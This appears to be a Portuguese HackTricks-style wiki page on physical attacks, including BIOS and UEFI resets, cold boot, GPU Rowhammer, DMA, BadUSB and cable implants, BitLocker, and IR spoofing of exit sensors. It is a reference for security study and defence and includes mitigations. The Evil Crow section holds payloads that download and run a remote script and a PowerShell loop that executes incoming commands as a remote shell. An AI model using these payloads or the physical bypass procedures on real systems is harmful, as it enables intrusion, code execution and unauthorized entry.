# Ataques físicos

{{#include ../banners/hacktricks-training.md}}

## Recuperação de senha do BIOS e segurança do sistema

As configurações de firmware de PCs antigos podem ser redefinidas desconectando a bateria CMOS ou usando um jumper documentado para limpar o CMOS. O tempo necessário com o equipamento desligado varia conforme a placa, e as senhas ou chaves modernas de UEFI podem estar armazenadas em memória flash não volátil, em um controlador integrado ou em um dispositivo de segurança e, portanto, persistir mesmo após a remoção da bateria. Consulte o manual da placa ou de serviço antes de curto-circuitar os pinos; esse procedimento também pode invalidar medições do TPM e acionar a recuperação da criptografia do disco.

Em sistemas x86 antigos, ferramentas como **killCMOS** e **CmosPwd** podem inspecionar ou alterar configurações armazenadas no CMOS a partir de um ambiente inicializável. O CmosPwd reconhece formatos de senha de um conjunto documentado de famílias antigas de BIOS e pode fazer backup, restaurar ou apagar/eliminar o estado do CMOS; suas versões publicadas são destinadas a ambientes DOS/Windows antigos, Linux, FreeBSD e NetBSD.<sup>[[18]](#references)</sup> Esses utilitários não são ferramentas genéricas para remover senhas de UEFI e exigem acesso suficiente ao hardware/firmware.

Alguns firmwares de laptop exibem um código de desafio específico do fabricante após várias tentativas de senha malsucedidas. Bancos de dados como [bios-pw.org](https://bios-pw.org) podem gerar senhas de recuperação antigas para alguns modelos, mas muitos sistemas implementam um bloqueio sem um desafio que possa ser derivado. Considere qualquer senha gerada específica para o modelo e evite esgotar contadores de tentativas permanentes.

### Segurança de UEFI

Em sistemas **UEFI** modernos, o CHIPSEC pode auditar as proteções das variáveis de Secure Boot. Comece com a verificação não modificadora abaixo; o modo opcional `-a modify` tenta corromper variáveis deliberadamente e só deve ser usado em um sistema de laboratório que possa ser recuperado. O próprio CHIPSEC alerta que seu driver privilegiado e o acesso de baixo nível ao hardware são inadequados para endpoints de produção.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Análise de RAM e Cold Boot Attacks

A DRAM não perde todos os bits imediatamente quando a atualização para. A taxa de degradação varia substancialmente conforme a tecnologia do módulo e a temperatura; o resfriamento pode preservar dados úteis por muito mais tempo do que um ciclo de energia sem resfriamento. Um cold-boot attack reinicia rapidamente o sistema em um ambiente mínimo de aquisição ou transfere um módulo resfriado, captura a memória bruta e reconstrói chaves criptográficas apesar da degradação dos bits. Um utilitário de cópia de disco não é automaticamente um imageador de memória física, e o Volatility analisa uma captura, mas não a adquire; use uma ferramenta de aquisição apropriada à plataforma e validada.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer contra tabelas de páginas

Os ataques modernos de GPU Rowhammer se tornam muito mais úteis quando têm como alvo **metadados de memória virtual da GPU**, em vez de buffers comuns. Pesquisas recentes em **GPUs NVIDIA Ampere com GDDR6** mostram que um invasor que executa código CUDA sem privilégios pode criar padrões de hammering específicos para GPU, usar **memory massaging** para posicionar estruturas de paginação em linhas vulneráveis e, então, inverter bits na **tabela de páginas de último nível** ou em um **diretório de páginas** intermediário. Depois que uma única entrada de tradução é corrompida, o invasor pode estabelecer **leitura/gravação arbitrária na memória da GPU** e, em seguida, avançar para o comprometimento do host.<sup>[[1]](#references)[[2]](#references)</sup>

### Padrão de exploração

1. **Identifique linhas suscetíveis a hammering** na GDDR6 e crie padrões de hammering cientes da atualização / não uniformes que contornem as mitigações na DRAM.
2. **Manipule as alocações da GPU** para que o driver coloque estruturas de tradução de páginas em locais físicos suscetíveis a hammering, em vez de mantê-las no pool protegido padrão. Na prática, isso pode envolver esgotar a região de baixa memória usada pelas tabelas de páginas e distribuir mapeamentos UVM esparsos de grande porte com strides controlados.
3. **Inverta bits dos metadados de tradução**, como **PFN** ou bits relacionados à abertura, dentro de uma entrada de tabela de páginas / diretório de páginas, para que a página virtual controlada pelo invasor aponte para páginas de tabelas de páginas, memória arbitrária da GPU ou mapeamentos de sistema visíveis ao host.
4. Reutilize o mapeamento forjado para reescrever outras entradas de tradução e escalar para **leitura/gravação arbitrária na memória da GPU** em vários contextos da GPU.

### Avanço para o host e mitigações

- Com a **IOMMU desativada**, mapeamentos forjados da abertura do sistema podem expor **memória física arbitrária do host** à GPU, transformando a primitiva da GPU em comprometimento completo do host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** tem como alvo entradas de tabelas de páginas de último nível, enquanto **GeForge** demonstra que corromper um nível do diretório de páginas pode ser mais fácil, pois uma inversão de bit pode redirecionar uma subárvore maior de traduções. Não considere apenas uma camada de paginação crítica para a segurança.<sup>[[1]](#references)[[2]](#references)</sup>
- A **IOMMU** continua sendo importante porque bloqueia o caminho direto para acessar memória arbitrária do host usado por GDDRHammer/GeForge, mas **não é uma mitigação completa**. **GPUBreach** demonstra um avanço em uma segunda etapa, na qual o invasor corrompe buffers de CPU graváveis pela GPU e pertencentes ao driver e, em seguida, aciona bugs de segurança de memória no driver da NVIDIA para obter uma primitiva de gravação no kernel e um **shell root**, mesmo com a IOMMU ativada.<sup>[[3]](#references)</sup>
- A **ECC em nível de sistema** é uma medida prática de fortalecimento em GPUs compatíveis para workstation/servidor. GPUs de consumo sem ECC oferecem uma superfície de defesa mais fraca.<sup>[[4]](#references)</sup>
- Esses ataques não são puramente teóricos: **GeForge** relatou **1.171** inversões de bits em uma RTX 3060 e **202** em uma RTX A6000, número suficiente para criar uma cadeia funcional de escalada de privilégios no host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataques de Acesso Direto à Memória (DMA)

Para aplicar patches offline a IFR/NVRAM da UEFI, o que pode reduzir o nível de imposição da IOMMU antes da inicialização e habilitar uma cadeia de DMA no Windows, consulte:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstra a aquisição e aplicação de patches à memória com base em **DMA** por interfaces como FireWire e configurações iniciais de Thunderbolt, incluindo assinaturas históricas de bypass de login. Não é simplesmente “ineficaz contra o Windows 10”: a explorabilidade depende da interface, da compilação de destino, da política da IOMMU, do estado de bloqueio e de o Windows Kernel DMA Protection ser compatível e estar ativado. O Windows 10 versão 1803 e posteriores introduziram o Kernel DMA Protection em plataformas compatíveis, alterando substancialmente a superfície de ataque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB para acesso ao sistema

Em um volume do Windows sem criptografia ou já desbloqueado, um ambiente offline pode substituir binários de acessibilidade, como **sethc.exe** ou **Utilman.exe**, por **cmd.exe**, permitindo abrir um prompt de comando SYSTEM quando o atalho correspondente da tela de logon é acionado. Ferramentas como **chntpw** podem editar os dados de contas locais do SAM. Esses métodos não contornam um volume BitLocker bloqueado e podem danificar credenciais protegidas por DPAPI/EFS; preserve cópias forenses e backups.

**Kon-Boot** é uma ferramenta comercial de bypass de autenticação durante a inicialização para configurações compatíveis de Windows/macOS. A compatibilidade depende do sistema operacional, do modo de firmware, do Secure Boot e da configuração de criptografia de disco; a ferramenta não descriptografa um volume BitLocker bloqueado.<sup>[[10]](#references)</sup>

---

## Como lidar com recursos de segurança do Windows

### Atalhos de inicialização e recuperação

- **Delete/Supr**, F2, F10 ou outra tecla do fabricante pode abrir a configuração do firmware.
- **F8** abre as opções avançadas de inicialização legadas do Windows somente em configurações nas quais esse caminho continua ativado; o acesso à recuperação atual varia.
- Manter **Shift** pressionada pode impedir o logon automático do Windows em algumas configurações, embora as definições de política/registro possam desativar esse comportamento.<sup>[[17]](#references)</sup>

### Dispositivos BAD USB

Dispositivos como **USB Rubber Ducky** e placas Teensy podem se identificar como teclados HID confiáveis e injetar sequências de teclas predefinidas. Inicialmente, o payload tem os privilégios e o acesso à área de trabalho da sessão conectada; prompts do UAC, bloqueio de tela, layout do teclado, temporização e política USB do endpoint continuam sendo fatores limitantes.<sup>[[15]](#references)</sup>

Periféricos programáveis também podem atacar parsers do kernel do host e coordenar vários dispositivos USB para preparar o heap e divulgar informações:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Privilégios de administrador ou de backup permitem criar uma cópia de sombra ou salvar hives do registro para adquirir arquivos bloqueados, como **SAM** e **SYSTEM**. Essa é uma técnica de coleta pós-comprometimento, não um bypass de privilégios, e deve ser correlacionada com eventos de `diskshadow`/VSS e exportação de hives do registro.

## Técnicas de implantes BadUSB / HID

### Dispositivo HID Android acionado por NFC

Um telefone Android com root pode se tornar um teclado USB programável somente quando o controlador USB e o kernel oferecem **suporte a USB gadget/HID**. Em dispositivos compatíveis, o Kali NetHunter disponibiliza perfis de gadget pelo **USB Arsenal**. Outra opção é o [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), que cria funções de gadget ConfigFS e pode disponibilizar dispositivos de caracteres para teclado/mouse, como `/dev/hidg0` e `/dev/hidg1`. A ferramenta apenas cria o endpoint do gadget; um processo separado precisa gravar relatórios HID nele. O acesso root não compensa a ausência de ConfigFS, suporte a HID gadget ou de um USB Device Controller utilizável no kernel.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Esse endpoint pode ser combinado com o NFC do Android como acionador físico. O aplicativo [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) lê o UID de uma tag, converte-o para a representação esperada, verifica uma lista de permissões local e envia uma sequência de teclado configurada no estilo Rubber Ducky após uma correspondência. O host conectado recebe entrada de teclado comum e não precisa de software NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Valide a enumeração e o layout do teclado em um editor de texto vazio antes de usar atalhos ou comandos. Um payload inofensivo é:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Limites de confiança importantes:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Uma **lista de permissões de UID é identificação, não autenticação**. Os UIDs são públicos, e alguns tipos de token ou emuladores permitem clonagem ou representação. Um UID permitido copiado segue o mesmo caminho de processamento do token original.
- O módulo Magisk **NfcScreenOff** corrige o serviço NFC para que ele se comporte como se a tela estivesse ligada e desbloqueada. Se o telefone já estiver conectado a um host, isso pode permitir que alguém acione o payload sem desbloquear o telefone.
- Senhas, tokens de API e comandos armazenados no payload são segredos recuperáveis em um dispositivo com root ou bootloader desbloqueado. Digitar uma senha por HID é automação com senha reutilizável, não autenticação sem senha.
- A injeção HID atua com os privilégios da área de trabalho ativa e depende do foco, do timing e do layout de teclado do host. Exija confirmação recente do usuário antes de executar ações confidenciais, evite segredos privilegiados em scripts e use um autenticador criptográfico de desafio-resposta para autenticação real.

### Implantes Wi-Fi em cabos

- Implantes baseados em ESP32-S3, como **Evil Crow Cable Wind**, ficam ocultos dentro de cabos USB-A→USB-C ou USB-C↔USB-C, são enumerados apenas como um teclado USB e expõem sua stack C2 por Wi-Fi. O operador só precisa alimentar o cabo pelo host da vítima, criar um hotspot chamado `Evil Crow Cable Wind` com a senha `123456789` e acessar [http://cable-wind.local/](http://cable-wind.local/) (ou o endereço DHCP) para chegar à interface HTTP integrada.<sup>[[8]](#references)</sup>
- A interface do navegador oferece abas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. Os payloads armazenados são identificados por sistema operacional, os layouts de teclado podem ser trocados na hora e as strings VID/PID podem ser alteradas para imitar periféricos conhecidos.
- Como o C2 fica dentro do cabo, um telefone pode preparar payloads, acionar a execução e gerenciar credenciais Wi-Fi sem usar a rede da organização — algo útil em invasões físicas de curta duração.

### Payloads AutoExec com reconhecimento do sistema operacional

- As regras AutoExec associam um ou mais payloads para serem executados imediatamente após a enumeração USB. O implante realiza uma identificação leve do sistema operacional e seleciona o script correspondente.
- Exemplo de fluxo de trabalho:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como a execução ocorre sem supervisão, basta trocar um cabo de carregamento para obter acesso inicial “plug-and-pwn” no contexto do usuário conectado.

### Shell remoto iniciado por HID via Wi-Fi TCP

1. **Inicialização por keystroke:** Um payload armazenado abre um console e cola um loop que executa tudo o que chegar pelo novo dispositivo serial USB. Uma variante mínima para Windows é:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Ponte de cabo:** O implante mantém o canal USB CDC aberto enquanto seu ESP32-S3 inicia um cliente TCP (script Python, APK Android ou executável para desktop) de volta ao operador. Todos os bytes digitados na sessão TCP são encaminhados para o loop serial acima, permitindo execução remota de comandos até mesmo em hosts isolados. A saída é limitada, então os operadores normalmente executam comandos às cegas (criação de contas, preparação de ferramentas adicionais etc.).

### Superfície de atualização HTTP OTA

- A interface documentada do Evil Crow Cable Wind expõe um endpoint de atualização de firmware sem autenticação em `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operadores de campo podem trocar recursos a quente (por exemplo, gravar o firmware do USB Army Knife) durante uma operação, sem abrir o cabo, permitindo que o implante passe a usar novos recursos enquanto continua conectado ao host-alvo.

## Bypassing BitLocker Encryption

Uma aquisição forense autorizada de um sistema ativo ou que tenha sido executado recentemente pode conter uma chave mestra de volume do BitLocker ou material de chave relacionado enquanto o volume estiver desbloqueado. Ferramentas comerciais como Elcomsoft Forensic Disk Decryptor e Passware Kit Forensic podem pesquisar imagens de memória, arquivos de hibernação ou despejos de memória compatíveis, mas o sucesso não é garantido. O Windows moderno também criptografa despejos de memória quando o BitLocker está habilitado, e uma senha de recuperação de 48 dígitos armazenada é um artefato diferente de uma chave de volume em memória.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering for Recovery Key Addition

Um atacante que convença um administrador a executar comandos de gerenciamento do BitLocker pode adicionar um protetor de senha de recuperação, chave externa ou outro tipo e, em seguida, capturá-lo. Uma senha de recuperação não pode ser uma sequência arbitrária de zeros: as senhas numéricas de recuperação do BitLocker têm um formato validado de 48 dígitos. A sintaxe relevante para administração autorizada é `manage-bde -protectors -add C: -recoverypassword`; liste os protetores resultantes com `manage-bde -protectors -get C:`. Monitore a adição de protetores e garanta que o novo material de recuperação seja armazenado apenas em locais aprovados.<sup>[[16]](#references)</sup>

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Muitos laptops modernos e desktops de formato compacto incluem um **interruptor de intrusão no chassi** monitorado pelo Embedded Controller (EC) e pelo firmware BIOS/UEFI. Embora o principal objetivo do interruptor seja gerar um alerta quando o dispositivo é aberto, às vezes os fabricantes implementam um **atalho de recuperação não documentado**, acionado quando o interruptor é alternado em um padrão específico.<sup>[[5]](#references)[[6]](#references)</sup>

### How the Attack Works

1. O interruptor está conectado a uma **interrupção GPIO** no EC.
2. O firmware em execução no EC controla o **tempo e o número de acionamentos**.
3. Quando um padrão codificado é reconhecido, o EC invoca uma rotina de *mainboard-reset* que **apaga o conteúdo da NVRAM/CMOS do sistema**.
4. Na inicialização seguinte, os modelos afetados carregam o estado de firmware redefinido. Dependendo do fabricante e da revisão, o estado apagado pode incluir uma senha de supervisor, configurações de inicialização personalizadas ou chaves Secure Boot inscritas; o estado do TPM e os efeitos sobre a criptografia de disco devem ser avaliados separadamente.

> Uma redefinição do firmware pode restaurar as opções de inicialização externa, mas **não** descriptografa o armazenamento. O BitLocker ou outro sistema de criptografia de disco completo pode entrar em modo de recuperação após alterações no TPM/firmware e ainda proteger a unidade interna sem uma chave de recuperação.<sup>[[16]](#references)</sup>

### Real-World Example – Framework 13 Laptop

O atalho de recuperação do Framework 13 (11ª/12ª/13ª geração) é:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Após o décimo ciclo, o EC define um sinalizador que instrui o BIOS a apagar a NVRAM na próxima reinicialização. Todo o procedimento leva cerca de 40 s e exige **apenas uma chave de fenda**.<sup>[[5]](#references)</sup>

### Procedimento Genérico de Exploração

1. Ligue o alvo ou suspenda-o e retome-o para que o EC esteja em execução.
2. Remova a tampa inferior para expor o interruptor de intrusão/manutenção.
3. Reproduza o padrão de alternância específico do fornecedor (consulte a documentação, os fóruns ou faça engenharia reversa do firmware do EC).
4. Recoloque a tampa e reinicie; em seguida, verifique quais configurações de firmware e credenciais realmente foram alteradas.
5. Se houver autorização e a inicialização externa estiver disponível, inicialize uma imagem live controlada. Depois que um volume interno for legitimamente desbloqueado (ou se nunca tiver sido criptografado), o ambiente live poderá obter credenciais e dados ou inspecionar a EFI System Partition. Modificar essa partição para instalar um implante EFI é persistente e altamente intrusivo, além de continuar sujeito às limitações do Secure Boot, da inicialização medida, da proteção contra gravação do firmware e do monitoramento de endpoints. O armazenamento criptografado continua inacessível sem a chave ou o material de recuperação.

### Detecção e Mitigação

* Registre eventos de intrusão no chassi no console de gerenciamento do SO e correlacione-os com reinicializações inesperadas do BIOS.
* Use **lacres que evidenciem violação** nos parafusos/tampas para detectar aberturas.
* Mantenha os dispositivos em **áreas com controle físico**; presuma que o acesso físico equivale ao comprometimento total.
* Quando disponível, desative o recurso do fornecedor “maintenance switch reset” ou exija uma autorização criptográfica adicional para redefinir a NVRAM.

---

## Injeção IR Encoberta Contra Sensores de Saída sem Toque

### Características do Sensor
- Sensores comuns de “wave-to-exit” combinam um emissor de LED IR próximo com um módulo receptor semelhante ao de um controle remoto de TV, que só informa nível lógico alto após detectar vários pulsos (~4–10) da portadora correta (≈30 kHz).<sup>[[7]](#references)</sup>
- Uma proteção plástica impede que o emissor e o receptor apontem diretamente um para o outro; assim, o controlador presume que qualquer portadora validada veio de um reflexo próximo e aciona um relé que destrava a fechadura da porta.
- Quando o controlador detecta a presença de um alvo, muitas vezes altera o envelope de modulação de saída, mas o receptor continua aceitando qualquer rajada que corresponda à portadora filtrada.

### Fluxo de Ataque
1. **Capture o perfil de emissão** – conecte um analisador lógico aos pinos do controlador para registrar as formas de onda anteriores e posteriores à detecção que acionam o LED IR interno.
2. **Reproduza apenas a forma de onda “pós-detecção”** – remova/ignore o emissor original e acione um LED IR externo com o padrão já disparado desde o início. Como o receptor só se importa com a contagem de pulsos/frequência, ele trata a portadora falsificada como um reflexo genuíno e ativa a linha do relé.
3. **Controle a transmissão por intervalos** – transmita a portadora em rajadas ajustadas (por exemplo, dezenas de milissegundos ligada e um intervalo semelhante desligada) para fornecer a contagem mínima de pulsos sem saturar o AGC do receptor nem a lógica de tratamento de interferência. A emissão contínua dessensibiliza rapidamente o sensor e impede o acionamento do relé.

### Injeção Reflexiva de Longo Alcance
- Substituir o LED de bancada por um diodo IR de alta potência, um driver MOSFET e óptica de focalização permite o acionamento confiável a ~6 m de distância.
- O atacante não precisa de linha de visada para a abertura do receptor; apontar o feixe para paredes internas, prateleiras ou batentes de porta visíveis através do vidro permite que a energia refletida entre no campo de visão de ~30° e imite o movimento de uma mão a curta distância.
- Como os receptores esperam apenas reflexos fracos, um feixe externo muito mais forte pode ricochetear em várias superfícies e ainda permanecer acima do limiar de detecção.

### Lanterna de Ataque Armada
- Incorporar o driver em uma lanterna comercial disfarça a ferramenta. Substitua o LED visível por um LED IR de alta potência compatível com a faixa do receptor, adicione um ATtiny412 (ou similar) para gerar rajadas de ≈30 kHz e use um MOSFET para drenar a corrente do LED.
- Uma lente telescópica de zoom estreita o feixe para aumentar o alcance/a precisão, enquanto um motor de vibração controlado pelo MCU fornece confirmação tátil de que a modulação está ativa, sem emitir luz visível.
- Alternar entre vários padrões de modulação armazenados (frequências de portadora e envelopes ligeiramente diferentes) aumenta a compatibilidade com famílias de sensores rebatizadas, permitindo que o operador varra superfícies refletoras até ouvir o clique do relé e a porta destravar.

---

## References

- [1] [GDDRHammer: Perturbação intensa das linhas DRAM — ataques Rowhammer entre componentes usando GPUs modernas](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Ataques à memória GDDR para forjar tabelas de páginas de GPU por diversão e lucro](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Ataques de escalonamento de privilégios em GPUs usando Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Aviso de segurança: Rowhammer - julho de 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Pressione aqui para comprometer”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guia de redefinição da placa-mãe](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Nãããão toque! – Como contornar sensores IR de saída sem toque com uma lanterna IR encoberta”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Conecte, use, comprometa: hacking com Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Ataque Rowhammer contra chips NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentação oficial e informações de compatibilidade do Kon-Boot](https://kon-boot.com/)
- [11] [Documentação do CHIPSEC - Proteções de variáveis do Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Para que não esqueçamos: ataques de cold boot contra chaves de criptografia](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulação de memória física por DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Proteção DMA do kernel](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentação do Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guia de operações do BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - comportamento de manter Shift pressionada e do logon automático](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentação e downloads do CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Documentação do Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Documentação do kernel Linux - driver de gadget USB HID](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [Ferramenta USB Gadget](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Transforme um telefone Android com root em um autenticador NFC e ferramenta de automação para seu PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
